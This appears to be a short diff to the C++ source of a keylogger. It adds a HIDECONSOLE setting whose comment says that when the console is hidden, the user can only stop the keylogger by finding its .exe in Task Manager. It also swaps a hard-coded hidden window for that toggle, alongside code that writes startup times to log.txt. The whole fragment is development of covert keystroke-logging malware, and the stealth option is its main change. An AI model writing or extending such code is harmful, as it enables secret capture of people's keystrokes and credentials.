@@ -5,6 +5,12 @@
 #include <ctime>
 using namespace std;
 
+/*
+    Set the value to true to hide the console, false to show it
+	If the console is hidden the user will have to close the keylogger by searching its .exe in the task manager
+*/
+const bool HIDECONSOLE = false;
+
 // Function Prototypes
 template <class T>
 void writeToFile(T input);
@@ -14,8 +20,14 @@ void checkForLowerCase(int &key);
 
 int main()
 {
-	//ShowWindow(GetConsoleWindow(), SW_NORMAL);
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	if (HIDECONSOLE)
+	{
+		ShowWindow(GetConsoleWindow(), SW_HIDE);
+	}
+	else
+	{
+		ShowWindow(GetConsoleWindow(), SW_NORMAL);
+	}
 
 	// To write the time at startup to the log.txt file
 	logTime();
